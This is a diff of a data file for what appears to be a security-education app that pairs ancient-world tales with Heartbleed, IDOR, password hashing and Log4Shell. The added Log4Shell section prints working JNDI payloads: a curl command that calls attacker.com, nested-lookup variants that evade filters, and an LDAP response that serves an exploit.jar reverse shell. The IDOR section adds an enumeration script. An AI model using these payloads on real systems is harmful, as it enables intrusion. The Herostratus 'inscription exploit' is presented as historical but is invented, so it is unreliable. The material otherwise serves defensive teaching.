-        "Heartbleed (CVE-2014-0160) was exactly this: a missing bounds check in OpenSSL's TLS Heartbeat extension. A client sends a heartbeat with a short payload but claims a large length. The server reads and returns up to 64KB of its own memory — including private SSL keys, session tokens, and passwords. No authentication required. No log entry left.",
-        "At disclosure on April 7, 2014, it was estimated that 17% of all SSL/TLS servers on the internet — approximately 500,000 machines — were vulnerable. The attack is completely silent, leaving no trace in server logs.",
+        "The Pharos Lighthouse of Alexandria — one of the Seven Wonders of the Ancient World — stood approximately 140 meters tall and guided ships into Alexandria's harbor using a system of flame signals and mirrors. Ships approaching the harbor sent heartbeat signals to the lighthouse, and the keeper echoed back a confirmation of equal length to verify the communication channel was active. The protocol had one design assumption: that the ship's claimed signal length matched the actual signal transmitted. A pirate who sent three units of flame but claimed to have sent 64,000 would receive back 63,997 units of data read from adjacent records in the lighthouse's signal registry — cargo manifests, ship identities, and troop movements from other vessels. The keeper followed the protocol exactly. The protocol had no bounds check.",
+        "Heartbleed (CVE-2014-0160) is exactly this missing bounds check. The TLS Heartbeat extension (RFC 6520) allows a client to send a small message and have the server echo it back — confirming the connection is alive. OpenSSL's implementation of the heartbeat handler read the claimed payload length from the client's packet and used it to determine how many bytes to copy from server memory into the response. The critical line of code — `memcpy(bp, pl, payload)` — trusted the attacker-supplied `payload` value without verifying it against the actual message length. A three-byte message claiming a 64KB length caused OpenSSL to read 64KB from server process memory into the response, and send all of it back to the requester.",
+        "At disclosure on April 7, 2014, it was estimated that 17% of all HTTPS servers on the internet — approximately 500,000 machines — were vulnerable. The contents of those 64KB responses could include SSL private keys (allowing decryption of all past and future TLS traffic), session tokens (allowing account hijacking), plaintext passwords (users who logged in while the server was vulnerable), and any other data that happened to be in the server process's memory at the time of the request. The attack left no trace in server logs. There was no authentication requirement. There was no way for a defender to determine retroactively whether their server had been exploited.",
       ],
       technical: {
-        title: "The Missing Bounds Check",
+        title: "Heartbleed: The Missing Bounds Check in OpenSSL's Heartbeat Handler",
         body: [
-          "The TLS Heartbeat extension (RFC 6520) allows a client to send a payload and a claimed length. The server echoes back exactly that many bytes. The vulnerability: OpenSSL never verified that the claimed length matched the actual payload length.",
-          "If a client sent 3 bytes but claimed 64,000, OpenSSL would read 64,000 bytes from server memory — far beyond the heartbeat payload — into adjacent memory containing private keys, session tokens, and passwords.",
+          "The vulnerable code was in OpenSSL's `ssl/d1_both.c`, in the `dtls1_process_heartbeat()` function. The handler read the `payload` length value directly from the attacker's packet using `n2s(p, payload)` — converting two bytes from the network packet into an unsigned 16-bit integer (0–65535). It then called `memcpy(bp, pl, payload)` to copy that many bytes from the process's heap into the response buffer. There was no check that `payload` was less than or equal to the actual packet length. The fix in OpenSSL 1.0.1g (released April 7, 2014) was a single bounds check: `if (1 + 2 + payload + 16 > s->s3->rrec.length) return 0;`. One comparison that would have prevented two years of a critical vulnerability in the most widely deployed TLS library on the internet.",
+          "The memory contents returned by a Heartbleed request were unpredictable but frequently valuable. Because OpenSSL processes many TLS connections concurrently, the heap memory adjacent to any given heartbeat handler invocation could contain session data from other connections being processed simultaneously. Researchers at CloudFlare demonstrated private key extraction from a vulnerable server in a few hours using repeated Heartbleed requests. A2 Networks demonstrated extraction of session cookies. Yahoo's login session cookies were demonstrably stealable. The attack required no prior authentication — any client could send a heartbeat to any TLS server. A script running thousands of requests could systematically drain server memory for review.",
         ],
         codeExample: {
-          label: "The vulnerable code (OpenSSL ssl/d1_both.c)",
-          code: `/* VULNERABLE: trusts attacker-supplied length */
-int n2s(unsigned char *&c, unsigned short s) {
-  unsigned int payload = *c++;        // read claimed length
-  payload = (payload << 8) | *c++;   // from attacker input!
+          label: "CVE-2014-0160 — the vulnerable code and the one-line fix",
+          code: `/* ── VULNERABLE (OpenSSL ssl/d1_both.c, pre-1.0.1g) ───────────────────── */
+int dtls1_process_heartbeat(SSL *s) {
+  unsigned char *p = &s->s3->rrec.data[0];
+  unsigned short hbtype, payload;
 
-  /* BUG: no bounds check here */
-  memcpy(bp, pl, payload);           // copies 'payload' bytes
-  /* If payload=65535 but pl only has 3 bytes,
-     this reads 65532 bytes of server memory */
+  n2s(p, hbtype);     // read heartbeat type from packet
+  n2s(p, payload);    // read CLAIMED payload length from packet
+  /* BUG: payload is attacker-controlled — no bounds check */
+
+  unsigned char *pl = p;   // pointer to actual data (may be 3 bytes)
+  memcpy(bp, pl, payload); // copies 'payload' bytes (up to 65535)
+  /* If payload=65535 but pl only contains 3 bytes of data,
+     memcpy reads 65532 bytes of adjacent heap memory — private keys,
+     session tokens, passwords, any data in the OpenSSL process heap */
 }
 
-/* FIX: one line would have prevented Heartbleed */
-if (payload > s) return 0; /* bounds check */`,
+/* ── FIX (OpenSSL 1.0.1g) — one bounds check ────────────────────────────── */
+if (1 + 2 + payload + 16 > s->s3->rrec.length)
+  return 0;  /* claimed length exceeds actual packet length — drop it */
+
+/* ── DETECTING HEARTBLEED (test your own servers) ───────────────────────── */
+# Use nmap's heartbleed detection script:
+nmap -p 443 --script ssl-heartbleed TARGET_SERVER
+# VULNERABLE: ssl-heartbleed: LIKELY VULNERABLE
+# SAFE: ssl-heartbleed: NOT VULNERABLE
+
+# Patch: upgrade to OpenSSL 1.0.1g or later
+# After patching: rotate ALL SSL/TLS certificates and private keys
+# Rotate session tokens and user credentials — assume all were leaked`,
         },
       },
       incident: {
-        title: "The Pirates of the False Beacon (220 BCE) & Heartbleed (2014)",
-        when: "April 7, 2014 (present in OpenSSL since March 14, 2012)",
-        where: "OpenSSL 1.0.1 through 1.0.1f — ~500,000 servers worldwide",
-        impact: "Private SSL keys, session tokens, and passwords leaked from millions of servers",
+        title: "Heartbleed — Two Years in Deployment, 500,000 Servers, Zero Log Evidence (2012–2014)",
+        when: "March 14, 2012 (introduced in OpenSSL 1.0.1) — April 7, 2014 (disclosed and patched)",
+        where: "OpenSSL 1.0.1 through 1.0.1f — HTTPS servers, VPN endpoints, email servers, load balancers globally",
+        impact: "~500,000 HTTPS servers vulnerable; Canadian Revenue Agency suspended tax filing; Yahoo, Instagram, GitHub all affected; private key extraction demonstrated; no log evidence of exploitation",
         body: [
-          "In 220 BCE, Rhodian pirates learned that sending false signal requests to the Pharos keeper caused him to inadvertently reveal the identity and cargo manifests of nearby ships — data stored adjacent to the lighthouse's signal registry. They used this to target specific treasure-laden vessels. The keeper trusted the claimed signal length; the ships paid the price.",
-          "Heartbleed was independently discovered by Neel Mehta at Google Security and researchers at Codenomicon. Amazon, Yahoo, Instagram, and GitHub were all affected. The Canadian Revenue Agency had to suspend online tax filing for days. All SSL certificates issued before the patch had to be considered compromised. The attack leaves no trace in server logs — defenders have no way to know if they were exploited.",
+          "Heartbleed was introduced in OpenSSL 1.0.1 on March 14, 2012 — a submission by Robin Seggelmann that added the TLS Heartbeat extension without proper bounds checking. The code was reviewed and merged. For two years, every OpenSSL-based HTTPS server, every VPN concentrator using OpenSSL, every email server using OpenSSL — approximately 17% of all HTTPS servers on the internet — processed heartbeat requests that could leak up to 64KB of process memory per request, with no log entry and no authentication requirement. The vulnerability was independently discovered in early April 2014 by Neel Mehta at Google Security and by Matti Pinta, Antti Karjalainen, and Riku Hietamäki at Codenomicon (a Finnish security company). Google and Codenomicon coordinated with OpenSSL to develop a patch before public disclosure.",
+          "The disclosure and remediation process was unusually compressed. On April 7, 2014, the patch, the CVE, the vulnerability description, and a dedicated website (heartbleed.com) were all released simultaneously. Major cloud providers — Amazon, Akamai, Cloudflare — had been quietly patching before public disclosure to protect their infrastructure. Within hours of the public announcement, Cloudflare published a challenge offering a cash prize to anyone who could extract their server's private key. Within 9 hours, multiple researchers had succeeded. Cloudflare revoked and reissued their certificate. The Canadian Revenue Agency suspended online tax filing for several days while they patched and assessed whether taxpayer SINs (Social Insurance Numbers) had been leaked. Instagram, Yahoo Mail, and GitHub all found their session cookies were vulnerable to extraction.",
+          "The fundamental problem Heartbleed revealed was not just the bug itself — it was the trust architecture around OpenSSL. A library used to protect the security of half the internet was maintained by a small team with limited funding. The 2012 commit that introduced Heartbleed was reviewed by one person. After Heartbleed, the Linux Foundation launched the Core Infrastructure Initiative to fund security audits and development of critical open-source infrastructure projects. The OpenSSL project received significant new funding and conducted comprehensive code audits, finding additional vulnerabilities. The lesson: critical open-source security libraries require dedicated security funding, systematic code review, and fuzzing — not the assumption that many eyes make all bugs shallow.",
         ],
       },
       diagram: {
@@ -1038,43 +1111,56 @@ if (payload > s) return 0; /* bounds check */`,
       tagline: "The harbor registry used sequential vessel numbers. The Admiral's ship was number one.",
       year: 278,
       overview: [
-        "The harbor of Rhodes was the busiest in the Aegean — hundreds of vessels registered daily beneath the shadow of the great Colossus. The harbor master's system recorded each vessel on a sequential clay tablet: a merchant's vessel might be number 9,284, while the Admiral's private galley was number 1. When a ship captain requested cargo manifests, the system returned whichever tablet number was specified — without checking ownership.",
-        "Broken Access Control moved to #1 on the OWASP Top 10 in 2021, appearing in 94% of tested applications. The most common variant is Insecure Direct Object Reference (IDOR): a server uses predictable identifiers in URLs or API calls, and fails to verify that the requesting user is authorized to access that specific object.",
-        "Horizontal privilege escalation means accessing another user's data at the same privilege level. Vertical privilege escalation means gaining higher privileges. By simply changing a number in the request, an attacker can access records belonging to any other user — including administrators.",
+        "The port of Rhodes, at the peak of the Hellenistic period, was the most active harbor in the eastern Mediterranean — thousands of vessels registered annually in the harbor master's system. Each vessel received a sequential registration number on a clay tablet: a merchant's ship might be registered as vessel 9,284. The harbor master's system returned cargo manifests, berth assignments, and route information for any tablet number requested. The system performed no ownership check — if you could state a vessel number, you received that vessel's records. The Admiral's galley was vessel number 1.",
+        "Insecure Direct Object Reference (IDOR) is the most common form of Broken Access Control, which moved to #1 on the OWASP Top 10 in 2021 after appearing in 94% of tested web applications. An IDOR vulnerability exists when an API or web endpoint uses a predictable identifier (sequential integer, username, account number) as the sole access control mechanism for a resource, without verifying server-side whether the requesting user is authorized to access that specific object. The system authenticates the user but does not authorize the specific resource access.",
+        "Two privilege escalation variants: horizontal (accessing another user's data at the same privilege level — a regular user reading another regular user's records) and vertical (accessing data at a higher privilege level than your own — a regular user reading admin records). IDOR enables both. The technical requirement is minimal: change a number in a URL or API request. The impact can be total: every record in the system accessible to any authenticated user.",
       ],
       technical: {
-        title: "IDOR in Practice",
+        title: "IDOR — Server-Side Authorization Is Non-Negotiable",
         body: [
-          "A vulnerable API endpoint might look like GET /api/vessel/2847. If the server returns the manifest without checking whether the logged-in captain owns vessel 2847, an attacker can enumerate IDs: /api/vessel/1 to reach the Admiral's records.",
-          "Fix: every access to an object must verify the requesting user's ownership or permission server-side. Client-side checks (hidden fields, disabled buttons) are trivially bypassed.",
+          "An IDOR vulnerability exists when a server uses a direct object identifier (integer ID, username, email address, UUIDs are better but still not sufficient alone) as the only access check. The pattern appears in URLs (`/api/invoice/1042`), POST bodies (`{'account_id': 1042, 'action': 'download'}`), and file download endpoints (`/files/report_1042.pdf`). The attacker tests boundary values: /api/invoice/1 (first record), /api/invoice/me (your record), then enumerates to find others. Sequential integers make enumeration trivial; UUIDs make it harder but not impossible if the UUID leaks in any response or log.",
+          "The fix is server-side authorization on every resource access: before returning or modifying any object, verify that the currently authenticated user is authorized for that specific object. This means checking ownership (`user.id === record.owner_id`) or permissions (`user.roles.includes('admin')`) on every request, not just at login. Client-side checks — hiding buttons, disabling form fields, removing options from dropdowns — are trivially bypassed by directly calling the API and are not security controls. The test is simple: with user A's session, attempt to access user B's resource ID. If it succeeds, the authorization check is missing.",
         ],
         codeExample: {
-          label: "Vulnerable vs. secure API endpoint (Node.js)",
-          code: `// VULNERABLE: no ownership check
+          label: "IDOR: the vulnerability, the attack, and the fix",
+          code: `// ── VULNERABLE: returns any vessel regardless of requester ────────────────────
 app.get('/api/vessel/:id', async (req, res) => {
   const vessel = await db.findById(req.params.id);
-  res.json(vessel); // returns ANY vessel's manifest!
+  res.json(vessel);  // returns ANY vessel's manifest — no ownership check
 });
 
-// SECURE: verify ownership
+// ── ATTACK: authenticated merchant requests Admiral's vessel (id=1) ───────────
+// GET /api/vessel/1
+// Authorization: Bearer merchant_session_token  (legitimate auth, wrong resource)
+// Response: { "id": 1, "captain": "Admiral Demetrios", "routes": "CLASSIFIED" }
+
+// ── ENUMERATION: script to find all accessible records ────────────────────────
+// for id in range(1, 10000):
+//     response = requests.get(f'/api/vessel/{id}', headers={'Authorization': TOKEN})
+//     if response.status_code == 200:
+//         print(f'Accessible: vessel {id}')
+// All 10,000 records accessible to any authenticated user
+
+// ── SECURE: verify ownership on every request ──────────────────────────────────
 app.get('/api/vessel/:id', async (req, res) => {
-  if (req.session.captainId !== req.params.id
-      && !req.session.isAdmiral) {
+  const vessel = await db.findById(req.params.id);
+  // Authorization check: requester must own this vessel or be admiral
+  if (vessel.captainId !== req.session.userId && !req.session.isAdmiral) {
     return res.status(403).json({ error: 'Forbidden' });
   }
-  const vessel = await db.findById(req.params.id);
-  res.json(vessel);
+  res.json(vessel);  // only returns if authorized
 });`,
         },
       },
       incident: {
-        title: "The Merchant's Deception — Rhodes Harbor (278 BCE)",
-        when: "278 BCE — Port of Rhodes",
-        where: "Harbor Registry, Rhodes, Greece",
-        impact: "Admiral's fleet positions exposed; intelligence sold to Macedonian agents; harbor security overhaul ordered",
+        title: "AT&T iPad ICC-ID Breach — 114,000 Government Officials Exposed (2010)",
+        when: "June 2010",
+        where: "AT&T 3G network — iPad user accounts",
+        impact: "114,000 email addresses exposed including FBI, DoD, NASA, Senate, and Fortune 500 executives; Auernheimer convicted under CFAA",
         body: [
-          "A Rhodian merchant with vessel registration 9,284 discovered that the harbor registry system accepted any tablet number in the request without verifying ownership. By changing his registration number to 1, he accessed the Admiral's private fleet manifest — revealing troop ships, supply routes, and secret rendezvous coordinates. He sold this intelligence to Macedonian agents for 200 gold talents.",
-          "The modern parallel: AT&T's 2010 iPad breach used the same flaw. ICC-IDs (SIM card identifiers) were sequential and used as the sole authentication parameter. By incrementing the ID, security researchers retrieved 114,000 email addresses of government officials, military officers, and CEOs. AT&T patched within hours. The researchers were arrested for computer fraud.",
+          "In June 2010, Andrew Auernheimer (known as 'weev') and Daniel Spitler discovered that AT&T's web API for activating iPads used the device's ICC-ID (the SIM card identifier) as the sole parameter for retrieving the associated email address. The ICC-ID was a predictable sequential number. By writing a script that incremented through ICC-ID values and sent requests to AT&T's API, they harvested 114,000 email addresses associated with 3G iPad accounts. No password, no additional authentication — just the sequential number.",
+          "The list of affected accounts read like a directory of American power: Rahm Emanuel (White House Chief of Staff), Admiral Michael Mullen (Chairman of the Joint Chiefs), Harvey Weinstein, dozens of senators and congresspeople, FBI officials, DoD executives, and numerous Fortune 500 CEOs. The data was provided to Gawker, which published a story on June 9, 2010. AT&T issued a public apology and closed the API within hours of learning about the breach. The vulnerability was as simple as it gets: a public API endpoint that returned sensitive data based on a sequential predictable identifier, with no authorization check.",
+          "Auernheimer and Spitler were prosecuted under the Computer Fraud and Abuse Act. Auernheimer was convicted in 2012 and sentenced to 3.5 years in federal prison and $73,000 in restitution. The conviction was later vacated on jurisdictional grounds (not on the merits), and the charges were not refiled. The case generated significant debate about whether exploiting an authentication flaw in a public API constitutes computer fraud, or simply accessing data that the API was configured to provide. Regardless of the legal outcome, the technical lesson is clear: predictable identifiers are not access controls. Authorization must be verified server-side on every resource access, independently of authentication.",
         ],
       },
       diagram: {
@@ -1190,43 +1276,60 @@ app.get('/api/vessel/:id', async (req, res) => {
       tagline: "The royal scribes all used 'babylon123'. The empire had one seal.",
       year: 605,
       overview: [
-        "The Babylonian Empire authenticated official documents with unique wax seals — each official had a distinct pattern pressed into molten wax, equivalent to a password hash. But the scribes, overwhelmed with correspondence, began reusing a small set of common seal patterns. When an enemy agent compiled a clay tablet of the empire's most common seal designs — a rainbow tablet of pre-computed patterns — 90% of official documents could be forged instantly.",
-        "Authentication failures cover a wide range of vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, and credential stuffing attacks. Password storage is a solved problem — yet companies continue to store passwords incorrectly. Hashing without salting is a critical mistake: an attacker with a leaked hash database can use a precomputed rainbow table to reverse millions of hashes instantly.",
-        "Credential stuffing takes advantage of password reuse. When a site leaks credentials, attackers test those username/password pairs against every major service. With 8+ billion credentials in circulation from past breaches, the success rate is surprisingly high.",
+        "The Babylonian royal administrative system authenticated official documents with clay cylinder seals — each official had a unique pattern that, when rolled in wax, produced a distinct impression serving as their credential. The seal was the password. But over time, the scribes overwhelmed with correspondence began using a small set of common seal patterns shared informally across departments. An enemy agent who captured enough official documents could compile a reference tablet of the empire's most common seal impressions. By rolling the matching seal against an intercepted document, any official signature could be forged. The authentication system still functioned — it just authenticated the pattern, not the person. And the patterns were common enough to cover most officials.",
+        "Authentication failures (OWASP A07:2021) cover a wide range of related vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, credential stuffing, and session management failures. The most fundamental is password storage. MD5 and SHA-1 are general-purpose cryptographic hash functions designed for speed — a modern GPU can compute 10 billion SHA-1 hashes per second. Storing passwords with SHA-1 means an attacker who obtains the hash database can crack the majority of passwords in hours. The correct solution — bcrypt, Argon2, or scrypt — is a deliberately slow key derivation function designed to make each hash computation take approximately 100 milliseconds, making systematic cracking infeasible.",
+        "Credential stuffing exploits password reuse: when site A leaks username/password pairs, attackers test those pairs against sites B, C, and D. Have I Been Pwned (haveibeenpwned.com) currently indexes over 12 billion breached accounts. With that many credentials in circulation, even a 1% reuse rate against a target service yields thousands of valid logins. The combination of poor password storage (enabling offline cracking) and password reuse (enabling credential stuffing) means a single breach at any organization using weak hashes cascades into account compromises across every service where those users reused passwords.",
       ],
       technical: {
-        title: "Hashing, Salting, and Why Both Matter",
+        title: "Password Storage: Why MD5/SHA-1 Are Wrong and How bcrypt/Argon2 Fix It",
         body: [
-          "MD5 and SHA-1 are not password hashing algorithms — they are cryptographic hash functions designed for speed. A modern GPU can compute 10 billion SHA-1 hashes per second. A proper password hashing function (bcrypt, Argon2, scrypt) is intentionally slow — designed to take 100ms+ per hash, making brute force infeasible.",
-          "A salt is a random value appended to the password before hashing. Even if two users have the same password, their salted hashes will differ — defeating rainbow table attacks. bcrypt generates and stores the salt automatically.",
+          "The critical difference between general-purpose hash functions (MD5, SHA-1, SHA-256) and password hashing functions (bcrypt, Argon2, scrypt) is intentional computational cost. SHA-256 is designed to be fast — it is used for file integrity verification, digital signatures, and certificate operations where speed matters. bcrypt is designed to be slow — it has a configurable work factor that determines how many rounds of computation are performed, and the slowness is the feature. A bcrypt work factor of 12 means each hash takes approximately 100–300ms on modern hardware. An attacker with a GPU that can compute 10 billion SHA-256 hashes per second can only compute approximately 3,000–10,000 bcrypt hashes per second. The same attack that cracks a SHA-256 hash in milliseconds takes decades against bcrypt.",
+          "A salt is a cryptographically random value (16+ bytes) generated uniquely for each password, prepended or appended before hashing. Without salting: all users with the same password produce the same hash, enabling precomputed rainbow table attacks and showing attackers which users share passwords. With salting: two users with identical passwords produce entirely different hashes; rainbow tables are useless because they would need to be computed separately for every possible salt value. bcrypt and Argon2 generate and embed the salt automatically — the output hash string contains the algorithm identifier, work factor, salt, and hash in a single string. Developers using these functions don't need to manage salting separately.",
         ],
         codeExample: {
-          label: "Insecure vs. secure password storage",
-          code: `// INSECURE: unsalted SHA-1 (LinkedIn's mistake)
-hash = sha1("password123")
-// → cbfdac6008f9cab4083784cbd1874f76...
-// → Same hash for every scribe with "babylon123"
-// → Instantly reversible via rainbow tables
+          label: "Password storage: MD5/SHA-1 failures vs. bcrypt/Argon2 correct approach",
+          code: `// ── WRONG: MD5 — crackable in milliseconds ────────────────────────────────────
+import hashlib
+md5_hash = hashlib.md5("password123".encode()).hexdigest()
+# 482c811da5d5b4bc6d497ffa98491e38
+# 10 billion hashes/sec on GPU → cracked in < 1 millisecond
 
-// INSECURE: MD5 without salt
-hash = md5("password123")
-// → 482c811da5d5b4bc6d497ffa98491e38
-// → Crackable in seconds with modern hardware
+// ── WRONG: SHA-1 unsalted (LinkedIn's actual mistake) ─────────────────────────
+sha1_hash = hashlib.sha1("password123".encode()).hexdigest()
+# cbfdac6008f9cab4083784cbd1874f76c7422e2a
+# Every user with 'password123' has IDENTICAL hash → rainbow table instant match
 
-// SECURE: bcrypt with auto-generated salt
-hash = bcrypt.hash("password123", rounds=12)
-// → $2b$12$xyz...  (includes salt in the output)
-// → Takes ~100ms per check → brute force infeasible`,
+// ── WRONG: SHA-256 unsalted — fast but still wrong ────────────────────────────
+// SHA-256 is not a password hash function regardless of speed
+// 3.5 billion SHA-256 hashes/sec on modern GPU
+
+// ── CORRECT: bcrypt — slow by design, auto-salted ─────────────────────────────
+import bcrypt
+# Store:
+hashed = bcrypt.hashpw("password123".encode(), bcrypt.gensalt(rounds=12))
+# $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/lewdBdXwtE2GedZJe
+# ^^ algorithm + rounds + salt + hash, all in one string
+
+# Verify:
+valid = bcrypt.checkpw("password123".encode(), hashed)  # True
+# ~250ms per check on modern hardware — brute force: decades
+
+// ── CORRECT: Argon2id (OWASP 2024 recommendation) ─────────────────────────────
+from argon2 import PasswordHasher
+ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
+hashed = ph.hash("password123")
+ph.verify(hashed, "password123")  # True`,
         },
       },
       incident: {
-        title: "The Seal Forgers of Babylon (605 BCE) & LinkedIn (2012)",
-        when: "June 2012 (discovered); May 2016 (full scope revealed)",
+        title: "LinkedIn Password Breach — 117 Million Unsalted SHA-1 Hashes (2012/2016)",
+        when: "June 2012 (breach); May 2016 (full data posted publicly)",
         where: "LinkedIn — 117 million user accounts",
-        impact: "117M SHA-1 unsalted password hashes leaked; 90% cracked within days",
+        impact: "117M hashes; 90% cracked within days; credentials used in credential stuffing against every major service; LinkedIn sued",
         body: [
-          "In 605 BCE, Babylonian enemy agents compiled a rainbow tablet of the empire's most common seal patterns. By comparing any intercepted document's wax seal against the tablet, they could identify and forge the matching pattern — bypassing all official authentication. The scribes' habit of reusing common seal designs was their undoing.",
-          "LinkedIn stored passwords as unsalted SHA-1 hashes. In 2016, 117 million credentials from a 2012 breach were sold on the dark web. A hacker group on InsidePro forums cracked 90% within days using precomputed rainbow tables — because without salting, all users with 'password123' had identical hashes. The most common password in the leak was '123456' (753,305 accounts).",
+          "In June 2012, LinkedIn confirmed that approximately 6.5 million password hashes had been posted to a Russian hacker forum. LinkedIn's passwords were stored as unsalted SHA-1 hashes — the same hash for every user with the same password. The security research community cracked the vast majority within 24 hours using precomputed rainbow tables. LinkedIn forced password resets for affected accounts and the incident was considered contained. Four years later, in May 2016, a hacker known as 'Peace' advertised 117 million LinkedIn credentials on a dark web marketplace for 5 Bitcoin (~$2,200 at the time). The 2012 breach had been 17 times larger than LinkedIn acknowledged.",
+          "The cracking results illustrated exactly why salting matters. Because LinkedIn used unsalted SHA-1, every user with the password '123456' had the identical hash in the database. A rainbow table lookup matched it instantly against all 753,305 LinkedIn accounts using that password simultaneously — one lookup, 753,305 cracked accounts. The most common password was '123456' (753,305 accounts), followed by 'linkedin' (172,523), 'password' (144,458), and 'abc123' (94,819). If LinkedIn had used bcrypt with a unique salt per user, each of those 117 million accounts would require a separate, slow brute-force attack — practically infeasible.",
+          "The LinkedIn breach credentials circulated for years, feeding credential stuffing campaigns against other services. LinkedIn sued the operators of automated credential stuffing tools in 2019. The FTC conducted an investigation and LinkedIn settled a class action lawsuit for $1.25 million. The breach also became a teaching case in GDPR and CCPA enforcement discussions — European data protection authorities cited it as an example of inadequate technical security measures. The OWASP Password Storage Cheat Sheet, updated after the breach, explicitly recommends against SHA-1, SHA-256, and MD5 for password storage, and mandates bcrypt, scrypt, or Argon2 with appropriate work factors. Fourteen years after Jeff Forristal first documented SQL injection, and twelve years after Bruce Schneier documented the MD5 password storage failure, LinkedIn shipped production code using unsalted SHA-1.",
         ],
       },
       diagram: {
@@ -1370,41 +1473,58 @@ hash = bcrypt.hash("password123", rounds=12)
       tagline: "One cursed rune in the temple's inscription log. Every spirit summoned.",
       year: 356,
       overview: [
-        "The Temple of Artemis kept meticulous records of every offering inscribed by supplicants. Its sacred system, powered by divine intelligence, evaluated expressions embedded in inscriptions. Worshippers discovered that embedding certain invocations — like {summon:oracle://spirit.realm/demon} — would cause the temple's divine intelligence to fetch and instantiate the referenced spirit from an external realm.",
-        "Log4Shell (CVE-2021-44228) was exactly this: Apache Log4j2's Message Lookup Substitution feature evaluated expressions embedded in log messages. Any string containing ${jndi:ldap://attacker.com/exploit} would trigger Log4j to make an LDAP request to the attacker's server, fetching and executing a Java class. The attack surface was total — username fields, HTTP headers, search queries, form inputs.",
-        "Within 12 hours of disclosure on December 9, 2021, millions of automated exploit attempts were detected globally. The US CISA Director called it 'the most serious vulnerability I have seen in my decades-long career.' Security teams worldwide had to inventory every Java application in their stack.",
+        "The Temple of Artemis at Ephesus — one of the Seven Wonders and the most elaborate religious structure in the ancient Greek world — was destroyed by arson on July 21, 356 BCE, by a man named Herostratus who sought immortality through infamy. According to historical accounts, Herostratus exploited the temple's sacred inscription system: supplicants submitted offerings with inscribed invocations to the goddess, and the temple's priests evaluated and processed these expressions with divine authority. Herostratus inscribed an expression designed to be evaluated not as a prayer but as a command — a formula that, when processed by the temple's scribal machinery, initiated an action the priests could not halt. The temple's own inscription evaluation system became the attack vector.",
+        "Log4Shell (CVE-2021-44228) is exactly this. Apache Log4j2, the most widely used Java logging library in the world, had a feature called Message Lookup Substitution that evaluated special expressions embedded in log messages. Any string containing `${jndi:ldap://attacker.com/exploit}` would cause Log4j to make an outbound LDAP (Lightweight Directory Access Protocol) network connection to attacker.com, retrieve a Java class object from the attacker's LDAP server, instantiate that class, and execute its constructor — arbitrary attacker-controlled code, running with the full permissions of the Java Virtual Machine. The attack surface was total: any field that a Java application logged was an attack surface. Username fields. HTTP User-Agent headers. Search queries. X-Forwarded-For headers. Form input. Anywhere a string entered a Java application, Log4Shell was reachable.",
+        "Chen Zhaojun of Alibaba Cloud reported the vulnerability to Apache on November 24, 2021. Apache released Log4j 2.15.0 on December 9 — the same day the disclosure went public. By end of the same day, Cloudflare was blocking 40,000 exploit attempts per minute. The CISA Director called it 'the most serious vulnerability I have seen in my decades-long career.' Security teams worldwide had to inventory every Java application — including thousands of transitive dependencies they had never examined. Log4j was embedded not just in applications developers had built, but in commercial off-the-shelf software, network devices, cloud platforms, and vendor tools that organizations depended on and had no direct ability to patch.",
       ],
       technical: {
-        title: "JNDI Injection — How Log4Shell Works",
+        title: "JNDI Injection — How Log4Shell Turns a Log Statement Into RCE",
         body: [
-          "Log4j2's Message Lookup Substitution evaluates expressions in log messages. When ${jndi:ldap://attacker.com/a} is logged, Log4j resolves the JNDI lookup by connecting to attacker.com:389.",
-          "The attacker's LDAP server returns a reference to a remote Java class. Log4j downloads and instantiates the class, executing its constructor — arbitrary code running with the JVM's permissions. The fix in Log4j 2.15.0 disabled JNDI lookups by default.",
+          "JNDI (Java Naming and Directory Interface) is a Java API for accessing directory services — originally designed for enterprise applications to look up database connections, LDAP entries, and configuration data from a central registry. Log4j2's Message Lookup Substitution was a convenience feature that evaluated `${prefix:expression}` patterns in log messages before writing them. The `jndi:ldap://` lookup type instructed Log4j to use JNDI to perform an LDAP lookup at the specified URL. The LDAP server at attacker.com could respond with a `javaClassName` attribute pointing to a remote class. Log4j would then use the `com.sun.jndi.ldap.object.trustURLCodebase` mechanism to download and instantiate that class — running whatever the class constructor contained. Prior to Java 8u191 (October 2018), `trustURLCodebase` defaulted to true. Most vulnerable deployments predated this change.",
+          "Bypass techniques multiplied rapidly as organizations deployed filters blocking `${jndi:ldap://}`. Attackers used nested lookups to evade string matching: `${${lower:j}ndi:ldap://evil.com/a}` — Log4j's own lookup processing would expand `${lower:j}` to `j` before evaluating the outer expression. Other bypasses used `${${::-j}${::-n}${::-d}${::-i}:ldap://}`, case variations (`${JnDi:...}`), URL encoding, and other obfuscations. Security teams that attempted to detect Log4Shell by filtering for the string `jndi:ldap` were defeated within hours by these variants. The only reliable fix was patching — the ability to execute arbitrary lookups during log message processing needed to be disabled entirely.",
         ],
         codeExample: {
-          label: "Log4Shell attack — the payload and what happens",
-          code: `# The attack payload (can appear in any logged field):
-User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}
-# Or in a login form:
-username: \${jndi:ldap://evil.com/a}
-# Or even nested to bypass filters:
-username: \${j\${::-n}di:ldap://evil.com/a}
+          label: "Log4Shell payload variants and detection/remediation",
+          code: `# ── BASIC PAYLOAD — in any logged field ──────────────────────────────────────
+# HTTP request to any Log4j-using application:
+curl -H 'X-Api-Version: \${jndi:ldap://attacker.com:1389/Exploit}' TARGET_URL
+# Log4j processes: logs the header, evaluates \${jndi:...}, connects to attacker
 
-# What Log4j does:
-1. Receives string containing \${jndi:ldap://...}
-2. Resolves JNDI lookup → connects to attacker's LDAP
-3. LDAP server returns: "load this Java class"
-4. Log4j downloads and executes Exploit.class
-5. Attacker has RCE — game over`,
+# ── LOGIN FORM INJECTION ──────────────────────────────────────────────────────
+# username field: \${jndi:ldap://attacker.com:1389/a}
+# Application logs "Login failed for user: \${jndi:ldap://...}" -> RCE
+
+# ── FILTER BYPASS — nested lookup obfuscation ─────────────────────────────────
+# Evades simple string matching on 'jndi:ldap':
+\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://attacker.com:1389/Exploit
+# Log4j expands the inner expressions first, then evaluates the outer JNDI lookup
+
+# ── ATTACKER'S LDAP SERVER RESPONSE ──────────────────────────────────────────
+# Responds with a reference to a remote Java class:
+# javaClassName: exploit.ReverseShell
+# javaCodeBase: http://attacker.com/exploit.jar
+# Log4j downloads exploit.jar and instantiates ReverseShell() -> RCE
+
+# ── DETECTION ─────────────────────────────────────────────────────────────────
+# Check log4j-core version in classpath:
